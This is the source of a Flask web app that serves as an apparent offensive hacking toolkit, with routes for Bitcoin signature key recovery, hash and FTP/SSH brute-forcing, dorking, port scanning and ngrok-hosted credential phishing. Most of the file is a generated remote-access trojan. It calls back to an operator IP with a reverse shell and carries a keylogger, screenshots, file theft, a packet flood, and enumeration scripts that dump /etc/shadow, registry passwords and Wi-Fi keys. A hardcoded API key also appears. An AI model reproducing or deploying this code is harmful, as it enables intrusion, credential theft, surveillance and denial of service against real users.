from flask import Flask,render_template,request,send_file,Response,url_for
from btc_exploit import rsz_exploit, raw_tx
from google_dorking.google_dorl import GooGle_Dork
from vunlseac import cve, vlunse, gtfobins
from Phishing import test_cli22
import subprocess as sp
from os import system
import multiprocessing
from cryptography_me_she import aes, hashs, rsa, bases
from hash_Name.hash_name import HASH_Name
from hash_bruutefrocer.hash_brute import Hash_Brut
from payload import lick
from werkzeug.utils import secure_filename
import os
from brute.protcal_brutfroce import ftp, ssh
from brute.last_brutfroce import btc_1, etm_1

UPLOAD_FOLDER = '/home/shiky/cp2/temp/testing'
filename=""
ALLOWED_EXTENSIONS = {'txt', 'cve', 'list', 'lst', 'text', 'passwd'}
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/')
def index():
   return render_template("index2.html")
@app.route('/btc.html')
def btc():
   return render_template("btc.html")
@app.route('/btc.html', methods =["GET", "POST"])
def btc_row():
   transion = request.form.get("transcation_p")
   if (transion == None ):
      return btc_exploit()
   else:
      RX = raw_tx.Get_RAW_TX()
      RX_Output: str = RX.raw_txt(str(transion))
      print(RX_Output)
      return render_template("btc.html", rowTran=str(RX_Output))
@app.route('/btc.html', methods =["GET", "POST"])
def btc_exploit():
   r: str = str(request.form.get("R"))
   s1: str = str(request.form.get("S1"))
   z1: str = str(request.form.get("Z1"))
   s2: str = str(request.form.get("S2"))
   z2: str = str(request.form.get("Z2"))
   address: str = str(request.form.get("Adress"))
   if (r == None and s1 == None and s2 == None and z1 == None and z2 == None):
      return btc_row()
   else:
      RSz = rsz_exploit.RSZ_EXploit()
      RSz_out: Set[str] = RSz.exploit(address, r, s1, s2, z1, z2)
      print(RSz_out)
      return render_template("btc.html", RSz_out=str(RSz_out))
@app.route('/cryptograpy.html')
def cryptograpy():
   return render_template("cryptograpy.html")
@app.route('/cryptograpy.html', methods =["GET", "POST"])
def crptoengolll():
   en_de=str(request.form.get('endeotype'))
   # crptot=str(request.form.get('crptotype'))
   crptofun=str(request.form.get('functiomtype'))
   key=str(request.form.get('keys'))
   msg=str(request.form.get('massg'))
   if(en_de=="en"):
      if(crptofun=="AES"):
         ke1 = key
         if (len(ke1) == 16):
            key = bytes(ke1, 'ascii')
         else:
            print("key size most be 16 ")
            os._exit(0)
         plantxt: str = msg
         AES_ED = aes.AES_CG()
         a: List[bytes] = AES_ED.encrp(plantxt, key)
         key: bytes = a[0]
         ciph: bytes = a[1]
         outp="encoded= "+ str(ciph)[1:] +"\nkey= "+ str(key)[1:]
         return render_template("cryptograpy.html", crotpmassg=outp)
      elif(crptofun=="RSA"):
         CP = msg
         RS = rsa.RSA_CG()
         keys = RS.gneKeys()
         # print(keys, '\n')
         enc = str(RS.encodme(CP, keys["pubkey"]))[1:]
         # print("encode= ", enc)
         outp=str(keys["privKey"])+"\nencode= "+ enc
         return render_template("cryptograpy.html", crotpmassg=outp)
      elif("base"in crptofun):
         BOutput: str = BS.base_encde(crptofun, msg)
         return render_template("cryptograpy.html", crotpmassg=BOutput)
      else:
         HA = hashs.Hashing()
         hash: str = HA.hashing(crptofun, msg)
         return render_template("cryptograpy.html", crotpmassg=hash)
   elif(en_de=="den"):
      if (crptofun == "AES"):
         ciph = bytes(msg, 'ascii')
         key = bytes(key, 'ascii')

         try:
            AES_ED = aes.AES_CG()
            dec: str = AES_ED.decp(ciph, key)
            outp = "decode= " + dec
            return render_template("cryptograpy.html", crotpmassg=outp)
         except e:
            return render_template("cryptograpy.html", crotpmassg="wrong key")
      elif (crptofun == "RSA"):
         enc=msg
         key=key
         RS = rsa.RSA_CG()
         # dec = str(RS.decome(enc, keys["privKey"]))[1:]
         dec = str(RS.decome(enc, key))[1:]
         print("decode= ", dec)
         outp="decode= "+ dec
         return render_template("cryptograpy.html", crotpmassg=outp)
      elif ("base" in crptofun):
         BOutput = BS.base_dencde(crptofun, msg)
         return render_template("cryptograpy.html", crotpmassg=BOutput)
      # else:
      #    return render_template("cryptograpy.html")
   else:
      return shoipk()


@app.route('/cryptograpy.html',  methods =["GET", "POST"])
def shoipk():
   # print("ho")
   hash2: str = str(request.form.get('hashingop'))
   hash: str = str(request.form.get('hash_n'))
   if (hash2 == "None" and hash !=None):
      return hash_brute_go()
   else:
      HN2 = HASH_Name()
      Houtput2: str = HN2.hahs_type(hash2)
      return render_template("cryptograpy.html", hashnameopppp=str(Houtput2))
@app.route('/cryptograpy.html', methods =["GET", "POST"])
def hash_brute_go():
   types: str = str(request.form.get('hash_type'))
   hash: str = str(request.form.get('hash_n'))
   HBrut = Hash_Brut()
   HB_Output: str = HBrut.hashdecod(types, hash)
   return render_template("cryptograpy.html", hashop=HB_Output)
@app.route('/google_dork.html')
def google_dork():
   return render_template("google_dork.html")
@app.route('/google_dork.html', methods =["GET", "POST"])
def google_dokout():
   search: str = str(request.form.get('searching'))
   dork: str = str(request.form.get('dorker'))
   GD = GooGle_Dork()
   GD_Output: str = GD.dork(search, dork)
   print(GD_Output)
   return render_template("google_dork.html", googleOut=str(GD_Output))

@app.route('/port_scan.html')
def port_scan():
   return render_template("port_scan.html")
@app.route('/port_scan.html', methods =["GET", "POST"])
def port_go():
   from port_scanner import port_scan
   target: str = str(request.form.get('targging'))
   port: str = str(request.form.get('portal'))
   option = 2
   if port =="all":
      option = 1
   timeoutes_str = ""
   LPSOutput0kop = []
   print("here",option,port)
   if option == 2:
      if (',' in target):
         sv: List[str] = target.split(',')
         for i in sv:
            print("target: " + str(i.strip(' ')))
            LPSOutput0kop.append(str("target: " + str(i.strip(' '))))
            PS = port_scan.PORT_SCAN(i.strip(' '))
            if timeoutes_str == "":
               if (',' in port):
                  PoS: List[str] = port.split(',')
                  for PK in PoS:
                     Pi: int = int(PK.strip(' '))
                     LPSOutput01: str = PS.scan_port(PS.target_p_ip, Pi)
                     if LPSOutput01 == None:
                        pass
                     else:
                        print(LPSOutput01)
                        LPSOutput0kop.append(LPSOutput01)
               else:
                  Pi: int = int(port.strip(' '))
                  LPSOutput01: str = PS.scan_port(PS.target_p_ip, Pi)
                  if LPSOutput01 == None:
                     pass
                  else:
                     print(LPSOutput01)
                     LPSOutput0kop.append(LPSOutput01)

      else:

         PS = port_scan.PORT_SCAN(target)
         print("target: " + str(target))

         if timeoutes_str == "":
            if (',' in port):
               PoS: List[str] = port.split(',')
               for pk in PoS:
                  # print("here2")
                  Pi: int = int(pk.strip(' '))
                  LPSOutput01: str = PS.scan_port(PS.target_p_ip, Pi)
                  if LPSOutput01 == None:
                     pass
                  else:
                     print(LPSOutput01)
                     LPSOutput0kop.append(LPSOutput01)
            else:
               Pi: int = int(port.strip(' '))
               LPSOutput01: str = PS.scan_port(PS.target_p_ip, Pi)
               if LPSOutput01 == None:
                  pass
               else:
                  print(LPSOutput01)
                  LPSOutput0kop.append(LPSOutput01)

         else:
            # print("here1")
            if (',' in port):
               # print("here")
               PoS: List[str] = port.split(',')
               for pk in PoS:
                  Pi: int = int(pk.strip(' '))
                  LPSOutput01 = PS.scan_port(PS.target_p_ip, Pi, float(timeoutes_str))
                  if LPSOutput01 == None:
                     pass
                  else:
                     print(LPSOutput01)
                     LPSOutput0kop.append(LPSOutput01)
            else:
               # print("here1")
               Pi: int = int(port.strip(' '))
               LPSOutput01 = PS.scan_port(PS.target_p_ip, Pi, float(timeoutes_str))
               if LPSOutput01 == None:
                  pass
               else:
                  print(LPSOutput01)
                  LPSOutput0kop.append(LPSOutput01)

   else:

      if (',' in target):
         sv = target.split(',')
         for i in sv:
            print("target: " + str(i.strip(' ')))
            LPSOutput0kop.append(str("target: " + str(i.strip(' '))))
            PS = port_scan.PORT_SCAN(i.strip(' '))
            if timeoutes_str == "":
               LPSOutput01 = PS.Scan_All_Ports()
               print(LPSOutput01)
               LPSOutput0kop.append(LPSOutput01)

      else:
         PS = port_scan.PORT_SCAN(target)
         print("target: " + str(target))
         if timeoutes_str == "":
            LPSOutput01 = PS.Scan_All_Ports()
            print(LPSOutput01)
            LPSOutput0kop.append(LPSOutput01)
   soutping=""
   if LPSOutput0kop == None:
      pass
   else:
      for out  in LPSOutput0kop:
         soutping+=str(out)+"\n"
   return render_template("port_scan.html", porting=str(soutping))
# @app.route('/web_scan.html')
# def web_scan():
   # return render_template("web_scan.html")

@app.route('/vuln_search.html')
def vuln_search():
   return render_template("vuln_search.html")

@app.route('/vuln_search.html', methods =["GET", "POST"])
def vuln_go():
   search: str = str(request.form.get('servicetx'))
   vuln_type: str = str(request.form.get('vulnapi'))
   vunlout=""
   if vuln_type == "vunldb":
      api_key: str = "66a0565094d918c985d5de682c87606b"
      # service: str = "ssh 2"
      VS = vlunse.Vulnerability_Search()
      bug: List[str] = VS.vuln_search(search, api_key)
      vunlout=bug
   elif vuln_type == "CVE":
      # search: str = "5.10.0 kali7"
      # search: str = "vsFTPd 2.3.4"
      CV = cve.CVE_Search()
      d: Dict[str, str] = CV.cve_search(search.replace(' ', '+'))
      vunlout=d
   elif vuln_type == "gtfobin":
      # search: str = "nmap"
      # dork:int=3
      GD = gtfobins.GooGle_Dork()
      GD_Output: str = GD.dork(search)
      vunlout=GD_Output
   return render_template("vuln_search.html", vunlout=str(vunlout))

@app.route('/phishing.html')
def phishing():
   return render_template("phishing.html")
@app.route('/phishing.html', methods =["GET", "POST"])
def phishinggo():
   page: str = str(request.form.get('page'))
   ptype:str= str(request.form.get('ptype'))
   rdurl:str = str(request.form.get('redurl'))
   dirk: str = str(sp.getoutput('pwd'))
   if ("/Phishing" not in dirk):
      dirk += "/Phishing"
   try:
      PHish = test_cli22.Phishing_cli()
      PHish.check_need()
      PHish.runPhishing(page, ptype,PHish.dirk)
      PHish.inputCustom(rdurl, dirk)
      port = 56
      PHish.runServer(port)
      url = PHish.runNgrok(port, dirk)
      print(url)
      while True:
         multiprocessing.Process(target=PHish.runServer, args=(port,)).start()
         out = PHish.getCredentialsWEB()
         for i in out:
            return render_template("phishing.html", phingurl=url, phinshingout=i)
   except KeyboardInterrupt:
      system('sudo pkill ngrok')

@app.route('/payload.html')
def payload():
   return render_template("payload.html")
@app.route('/payload.html', methods =["GET", "POST"])
def paylod_go_connect_sh():
   ip: str = str(request.form.get('ips'))
   port: str = str(request.form.get('ports'))
   if request.form.get('listening') == 'listening':
      print("listening pressed")
      # host = str(self.lineEdit2.text())
      port = int(port)
      global rv
      rv = lick.revab(ip, port)
      rv.getconnections()
      rv.allin()
      address = rv.allAddress
      ad="connections:\n"
      for i in address:
         ad+=str([i[0] + ":" + str(i[1])])+"\n"
      return render_template("payload.html", targetstoconnct=ad)
   elif request.form.get('genrating') == 'genrating':
      print("genrating pressed")
      payload_strick = """
      import os, json, subprocess, sys, threading, random, socket
      from urllib.request import Request, urlopen

      try:
          from pynput.keyboard import Listener
          from PIL import ImageGrab
          from scapy.all import *
      except:
          os.system("pip install PIL")
          os.system("pip install pynput")
          os.system("pip install scapy")
          from pynput.keyboard import Listener
          from PIL import ImageGrab
          from scapy.all import *

      keys = []
      count = 0
      # path_windos = "\\\Keyloags.txt"
      path_unix = "/tmp/keyloags.txt"
      if "nt" in os.name:
          p = subprocess.Popen("powershell $env:TEMP", shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
          output = p.stdout.read()
          output = output.decode()
          o = output.replace(" ", "").replace("\\r", "").replace("\\n", "").replace("'", "").replace("Path", "").replace("--","")
          path_unix = o + "\\\keyloags.txt"
      else:
          path_unix = "/tmp/keyloags.txt"
      global flage
      flage = 0


      def write_file(keys):
          with open(path_unix, "a") as wfile:
              for key in keys:
                  k = str(key).replace("'", "")
                  if (k.find("backspace") > 0):
                      wfile.write(" Backspace ")
                  elif (k.find("enter") > 0):
                      wfile.write("\\n")
                  elif (k.find("shift") > 0):
                      wfile.write(" Shift ")
                  elif (k.find("space") > 0):
                      wfile.write("    ")
                  elif (k.find("caps_lock") > 0):
                      wfile.write(" Caps_lock ")
                  elif (k.find("up") > 0):
                      wfile.write(" Key.up ")
                  elif (k.find("down") > 0):
                      wfile.write(" Key.down ")
                  elif (k.find("right") > 0):
                      wfile.write(" Key.right ")
                  elif (k.find("lefts") > 0):
                      wfile.write(" Key.lefts ")
                  elif (k.find("ctrl_r") > 0):
                      wfile.write(" Key.ctrl_r ")
                  elif (k.find("tab") > 0):
                      wfile.write(" Key.tab ")
                  elif (k.find("alt") > 0):
                      wfile.write(" Key.alt ")
                  elif (k.find("key")):
                      wfile.write(k)


      def on_press(key):
          global keys, count
          keys.append(key)
          count += 1
          if (count >= 1):
              count = 0
              write_file(keys)
              keys = []


      def key_logs():
          os.remove(path_unix)
          global listener
          with Listener(on_press=on_press) as listener:
              listener.join()


      def stop_key_log():
          flage = 1
          listener.stop()
          upload_file(path_unix)


      def dos(target_IP, stop):
          # target_IP = input("Enter IP address of Target: ")
          i = 1
          while True:
              a = str(random.randint(1, 254))
              b = str(random.randint(1, 254))
              c = str(random.randint(1, 254))
              d = str(random.randint(1, 254))
              dot = "."
              Source_ip = a + dot + b + dot + c + dot + d
              for source_port in range(1, 65535):
                  IP1 = IP(source_IP=Source_ip, destination=target_IP)
                  TCP1 = TCP(srcport=80, dstport=80)
                  pkt = IP1 / TCP1
                  send(pkt, inter=.001)
                  connt.send("packet sent " + str(i))
                  i = i + 1
                  if (stop == i):
                      break


      def full_shell():
          # print(port)
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
          s.connect((host, port + 1));
          # reliable_send(li)
          os.dup2(s.fileno(), 0);
          os.dup2(s.fileno(), 1);
          os.dup2(s.fileno(), 2);
          if "nt" in os.name:
              p = subprocess.call(["cmd.exe", ""]);
          else:
              p = subprocess.call(["/bin/sh", "-i"]);


      def screen_shoter():
          screen_shot = ImageGrab.grab()
          if "nt" in os.name:
              p = subprocess.Popen("powershell $env:TEMP", shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
              output = p.stdout.read()
              output = output.decode()
              o = output.replace(" ", "").replace("\\r", "").replace("\\n", "").replace("'", "").replace("Path", "").replace(
                  "--", "")
              screen_shot.save(o + "\\\screep.png")
          else:
              screen_shot.save("/temp/screep.png")


      def upload_file(file_name):
          f = open(file_name, "rb")
          connt.send(f.read())


      def download_file(file_name):
          k = "/"
          if "nt" in os.name:
              k = "\\\\"
          else:
              k = "/"
          c = 0
          while True:
              if ("/" in k or "\\\\" in k):
                  k = file_name[c:]
                  c += 1
              # print("her", k)
              # print(c)
              else:
                  break
          # print(k)
          f = open(k, "wb")
          # print('kkkk')
          connt.settimeout(1)
          chunk = connt.recv(1024)
          while chunk:
              f.write(chunk)
              try:
                  chunk = connt.recv(1024)
              except socket.timeout as e:
                  break
          connt.settimeout(None)
          f.close()


      def relaible_recv():
          data = ''
          while True:
              try:
                  data = data + connt.recv(1024).decode().rstrip()
                  return json.loads(data)
              except ValueError:
                  continue


      def reliable_send(data):
          jsondata = json.dumps(data)
          connt.send(jsondata.encode())


      def shell_do():
          while True:
              command = relaible_recv()
              # print(command)
              if (command == "exit"):
                  break
              # if (command == ""):
              #   pass
              elif (command == "stkeylog"):
                  t = threading.Thread(target=key_logs)
                  t.start()
                  reliable_send("key loger is started")
              # while flage !=1:
              # stop_key_log()
              elif (command == "spkeylog"):
                  # t = threading.Thread(taget=key_logs)
                  # t.start()
                  # while flage !=1:
                  stop_key_log()
                  t.join()
              elif (command[:3] == "dos"):
                  comm = command[4:]
                  t_ip = str(comm[0:comm.find(" ")])
                  stop_at = int(comm[comm.find(" "):].replace(" ", "")) + 1
                  dos(t_ip, stop_at)

              elif (command == "screenshoot"):
                  screen_shoter()
                  if "nt" in os.name:
                      p = subprocess.Popen("powershell $env:TEMP", shell=False, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                      output = p.stdout.read()
                      output = output.decode()
                      o = output.replace(" ", "").replace("\\r", "").replace("\\n", "").replace("'", "").replace("Path",
                                                                                                               "").replace(
                          "--", "")
                      upload_file(o + "\\\screep.png")
                  else:
                      upload_file("/temp/screep.png")
              elif (command[:6] == "upload"):
                  download_file(command[7:])
              elif (command[:8] == "download"):
                  reliable_send(command)
                  upload_file(command[9:])
              # time.sleep(4)
              elif (command == "shell"):
                  # while command == "" or command == "shell" or command == None:
                  t2 = threading.Thread(target=full_shell)
                  t2.start()
                  t2.join()
              elif (command == "enum"):
                  if "nt" in os.name:
                      print("windows")
                      f = '''echo #########user info > %temp%\\\winenumoutp22.txt
      echo ##################Hostname >> %temp%\\\winenumoutp22.txt
      hostname >> %temp%\\\winenumoutp22.txt
      echo. >> %temp%\\\winenumoutp22.txt

      echo ##################whoami >> %temp%\\\winenumoutp22.txt
      whoami >> %temp%\\\winenumoutp22.txt
      echo. >> %temp%\\\winenumoutp22.txt

      echo ##################echo %%USERNAME%% >> %temp%\\\winenumoutp22.txt
      echo %USERNAME% >> %temp%\\\winenumoutp22.txt
      echo. >> %temp%\\\winenumoutp22.txt

      echo ##################net users >> %temp%\\\winenumoutp22.txt
      net users >> %temp%\\\winenumoutp22.txt
      echo. >> %temp%\\\winenumoutp22.txt

      echo ##################net user %%USERNAME%% >> %temp%\\\winenumoutp22.txt
      net user %USERNAME% >> %temp%\\\winenumoutp22.txt
      echo. >> %temp%\\\winenumoutp22.txt

      echo ################## systeminfo >> %temp%\\\winenumoutp22.txt
      systeminfo >> %temp%\\\winenumoutp22.txt
      echo. >> %temp%\\\winenumoutp22.txt

      echo ################## fsutil fsinfo drives >> %temp%\\\winenumoutp22.txt
      fsutil fsinfo drives >> %temp%\\\winenumoutp22.txt
      echo. >> %temp%\\\winenumoutp22.txt

      echo ################## path >> %temp%\\\winenumoutp22.txt
      echo %PATH% >> %temp%\\\winenumoutp22.txt
      echo. >> %temp%\\\winenumoutp22.txt

      echo ################## tasklist /SVC >> %temp%\\\winenumoutp22.txt
      tasklist /SVC >> %temp%\\\winenumoutp22.txt
      echo. >> %temp%\\\winenumoutp22.txt

      echo ################## Checking if .msi files are always installed with elevated privlidges>> %temp%\\\winenumoutp22.txt
      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /v AlwaysInstallElevated >> %temp%\\\winenumoutp22.txt
      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /v AlwaysInstallElevated >> %temp%\\\winenumoutp22.txt
      echo. >> %temp%\\\winenumoutp22.txt

      echo #### Checking for backup SAM files >> %temp%\\\winenumoutp22.txt

      echo #### dir %SYSTEMROOT%\\repair\SAM >> %temp%\\\winenumoutp22.txt
      dir %%SYSTEMROOT%%\\repair\SAM >> %temp%\\\winenumoutp22.txt

      echo #### dir %SYSTEMROOT%\system32\config\\regback\SAM >> %temp%\\\winenumoutp22.txt
      dir %%SYSTEMROOT%%\system32\config\\regback\SAM >> %temp%\\\winenumoutp22.txt
      echo. >> %temp%\\\winenumoutp22.txt

      echo #### USES AccessChk from sysinternals >> %temp%\\winenumoutp22.txt
      accesschk.exe -uwcqv "Authenticated Users" * /accepteula >> %temp%\\winenumoutp22.txt
      accesschk.exe -uwcqv "Users" * /accepteula >> %temp%\\winenumoutp22.txt
      accesschk.exe -uwcqv "Everyone" * /accepteula >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## Checking for possible creds >> %temp%\\winenumoutp22.txt

      echo ################## type c:\sysprep.inf >> %temp%\\winenumoutp22.txt
      type c:\sysprep.inf >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## type c:\sysprep\sysprep.xml>> %temp%\\winenumoutp22.txt
      type c:\sysprep\sysprep.xml >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## Network Information >> %temp%\\winenumoutp22.txt

      echo ################## ipconfig /all >> %temp%\\winenumoutp22.txt
      ipconfig /all >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## net use (view current connetions) >> %temp%\\winenumoutp22.txt
      net use >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## net share (view shares) >> %temp%\\winenumoutp22.txt
      net share >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## arp -a >> %temp%\\winenumoutp22.txt
      arp -a >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## route print>> %temp%\\winenumoutp22.txt
      route print >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## netstat -nao >> %temp%\\winenumoutp22.txt
      netstat -nao >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## netsh firewall show state >> %temp%\\winenumoutp22.txt
      netsh firewall show state >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## netsh firewall show config >> %temp%\\winenumoutp22.txt
      netsh firewall show config >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## Shows wireless network information>> %temp%\\winenumoutp22.txt
      netsh wlan export profile key=clear
      type wi-fi*.xml >> %temp%\\winenumoutp22.txt
      del wi-fi*.xml
      echo. >> %temp%\\winenumoutp22.txt


      echo ################## schtasks /query /fo LIST /v >> %temp%\\winenumoutp22.txt
      schtasks /query /fo LIST /v >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## net start >> %temp%\\winenumoutp22.txt
      net start >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## DRIVERQUERY >> %temp%\\winenumoutp22.txt
      DRIVERQUERY >> %temp%\\winenumoutp22.txt
      echo. >> %temp%\\winenumoutp22.txt

      echo ################## Any mentions of "password" in the registry >> %temp%\\winenumoutp22.txt

      reg query HKLM /f password  /t REG_SZ  /s >> %temp%\\winenumoutp22.txt

      echo. >> %temp%\\winenumoutp22.txt
      echo ################## Checking for services >> %temp%\\winenumoutp22.txt
      wmic service get name,displayname,pathname,startmode | findstr /i "auto"  >> %temp%\\winenumoutp22.txt
      '''
                      f2 = open("f.bat", "w")
                      f2.write(f)
                      f2.close()
                      f3 = open("f.bat", "r")
                      for i in f3:
                          os.system(str(i.replace("\\n", '')))
                      p = subprocess.Popen("powershell $env:TEMP", shell=False, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                      output = p.stdout.read()
                      output = output.decode()
                      o = output.replace(" ", "").replace("\\r", "").replace("\\n", "").replace("'", "").replace("Path",
                                                                                                               "").replace(
                          "--", "")
                      upload_file(o + "\\\winenumoutp22.txt")
                      os.system("powershell rm f.bat")
                  else:
                      f = '''echo "user_name " >>/tmp/enum55.txt 
      whoami >>/tmp/enum55.txt
      echo "hostname " >>/tmp/enum55.txt 
      hostname >>/tmp/enum55.txt
      echo "Kernel information " >>/tmp/enum55.txt 
      uname -a >>/tmp/enum55.txt
      cat /proc/version >>/tmp/enum55.txt
      cat /etc/*-release >>/tmp/enum55.txt
      echo "user id  " >>/tmp/enum55.txt 
      id >>/tmp/enum55.txt
      echo "last logged on user information " >>/tmp/enum55.txt
      lastlog >>/tmp/enum55.txt
      echo "logs  " >>/tmp/enum55.txt 
      w >>/tmp/enum55.txt
      echo "see passwd  " >>/tmp/enum55.txt 
      cat /etc/shadow >>/tmp/enum55.txt
      cat /etc/passwd >>/tmp/enum55.txt
      echo "grpinfo  " >>/tmp/enum55.txt 
      echo -e "$grpinfo" | grep adm >>/tmp/enum55.txt
      echo "installed dpkg  " >>/tmp/enum55.txt 
      dpkg -l >>/tmp/enum55.txt
      echo "files that has sudo  " >>/tmp/enum55.txt 
      echo "" | sudo -S -l -k >>/tmp/enum55.txt
      echo "directory permissions  " >>/tmp/enum55.txt 
      ls -ahl /home/ >>/tmp/enum55.txt
      ls -ahl >>/tmp/enum55.txt
      echo "cronjub enum " >>/tmp/enum55.txt 
      ls -la /etc/cron* >>/tmp/enum55.txt
      cat /etc/crontab >>/tmp/enum55.txt
      echo "service enum " >>/tmp/enum55.txt 
      systemctl list-timers --all >>/tmp/enum55.txt
      systemctl list-timers  |head -n -1     >>/tmp/enum55.txt
      echo "network enum " >>/tmp/enum55.txt 
      /sbin/ifconfig -a >>/tmp/enum55.txt
      /sbin/ip a  >>/tmp/enum55.txt
      arp -a >>/tmp/enum55.txt
      ip n >>/tmp/enum55.txt
      grep "nameserver" /etc/resolv.conf >>/tmp/enum55.txt
      systemd-resolve --status 2 >>/tmp/enum55.txt
      netstat -ntpl >>/tmp/enum55.txt
      ss -t -l -n >>/tmp/enum55.txt
      netstat -nupl >>/tmp/enum55.txt
      ss -u -l -n >>/tmp/enum55.txt
      echo "running proces " >>/tmp/enum55.txt 
      ps aux >>/tmp/enum55.txt
      echo "database enum " >>/tmp/enum55.txt 
      mysql --version >>/tmp/enum55.txt
      mysqladmin -uroot -proot version >>/tmp/enum55.txt
      mysqladmin -uroot version >>/tmp/enum55.txt
      psql -V  >>/tmp/enum55.txt
      echo "apache enum " >>/tmp/enum55.txt 
      apache2 -v >>/tmp/enum55.txt
      grep -i "user\|group" /etc/apache2/envvars  >>/tmp/enum55.txt
      echo "files enum " >>/tmp/enum55.txt 
      find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; >>/tmp/enum55.txt'''
                      f2 = open("f.sh", "w")
                      f2.write(f)
                      f2.close()
                      f3 = open("f.sh", "r")

                      for i in f3:
                          os.system(str(i.replace("\\n", '')))
                      upload_file("/tmp/enum55.txt")
                      os.system("rm f.sh")

              else:
                  try:
                      if "nt" in os.name:
                          command = "powershell " + command
                      else:
                          command = command
                      echut = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                      output = echut.stdout.read() + echut.stderr.read()
                      output = output.decode()
                      reliable_send(output)
                  except:
                      reliable_send("error")
      #
              """
      payload_name = "payload.py"
      if ("http" not in port):
         print("h")
         # ip = str(self.lineEdit.text())
         port = int(port)
         payload = payload_strick + f"""
      while True:
                      try:
                           host = "{ip}"
                           port = {port}
                           connt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                           connt.connect((host, port))
                           shell_do()
                      except:
                           pass
                  """
         # payload=payload.replace('\r','\\r').replace('\n','\\n')
         save = open(payload_name, 'w')
         save.write(payload)
         save.close()
         print("done")
      else:
         # ip = str(self.lineEdit.text())
         # port = int(port)
         payload = payload_strick + f"""
      from urllib.request import Request, urlopen
      while True:
                                  try:
                                       host = "{ip}"
                                       req1 = Request("{port}")
                                       port= int(urlopen(req1).read().decode().replace("\\n",""))
                                       connt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                       connt.connect((host, port))
                                       shell_do()
                                  except:
                                       pass
                              """
         save = open(payload_name, 'w')
         save.write(payload)
         save.close()
         print("done")
      path = "payload/back_dor2s.py"
      return send_file(path, as_attachment=True)
   else:
      return paylod_go_ha_sh()
      # return render_template("payload.html")
@app.route('/payload.html', methods =["GET", "POST"])
def paylod_go_ha_sh():
   tarid: str = str(request.form.get('tids'))
   comand: str = str(request.form.get('commands'))
   print(comand)
   if (tarid.lower() == "all"):
      print(tarid)
      scmall=""
      for i in rv.allAddress:
         rv.GUI_accept_con2(rv.allAddress.index(i))
         scmall+=str("target" + i[0] + ":" + str(i[1]) + "\n" + rv.GUI_communication(comand))+"\n"
      return render_template("payload.html", targetcommandout=str(scmall))
   else:
      print(tarid)
      tip = tarid[0:tarid.find(':')]
      tport = tarid[tarid.find(':'):].replace(":", "")
      targ = (tip, int(tport))
      rv.GUI_accept_con2(rv.allAddress.index(targ))
      return render_template("payload.html", targetcommandout=str(("target" + targ[0] + ":" + str(targ[1]) + "\n" + rv.GUI_communication(comand))))
   # return render_template("payload.html",targetcommandout="his")
# @app.route('/brutefroce.html')
# def brutefroce():
   # return render_template("brutefroce.html")
# global passwords,ftp
@app.route('/service_brute_goh')
def service_brute_goh(passwords):
   passwords = passwords
   def inner():
      for password in passwords:
         ftb = ftp.connect_ftp(password)
         if ftb != None:
            print(f"{ftp.GREEN}[+] Found credentials: \n")
            print(f"{ftb} {ftp.RESET}")
            yield str('[+] Found credentials: \n' + ftb) + '<br/>\n'
            break
         yield str("tring pass:" + password) + '<br/>\n'

   return Response(inner(), mimetype='text/html')
# @app.route('/brutefroce.html', methods =["GET", "POST"])
# def brutefroce_go():
   # service: str = str(request.form.get('servicetype'))
   # username: str = str(request.form.get('username'))
   # target: str = str(request.form.get('target'))
   # file = request.files['file']
   # if file and allowed_file(file.filename):
   #    filename = secure_filename(file.filename)
   #    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
   #    filepas=str(os.path.join(app.config['UPLOAD_FOLDER'], filename))
   #    print(filepas)
   #    if(service=="ftp"):
   #       port = 21
   #       passwords = open(filepas).read().split("\n")
   #       print("[+] Passwords to try:", len(passwords))
   #       ftp = ftp_brute(target, username, port)
   #       try:
   #          return service_brute_goh(passwords)
   #       except:
   #          pass
   #    elif(service=="ssh"):
   #       pass

   #    return render_template('brutefroce.html')
   # return render_template("brutefroce.html")
@app.route('/index.html')
def index2():
   return render_template("index2.html")
@app.route('/test.html')
def test():
   return render_template("test.html")
def mainW():
   app.run()
if __name__ == '__main__':
   mainW()
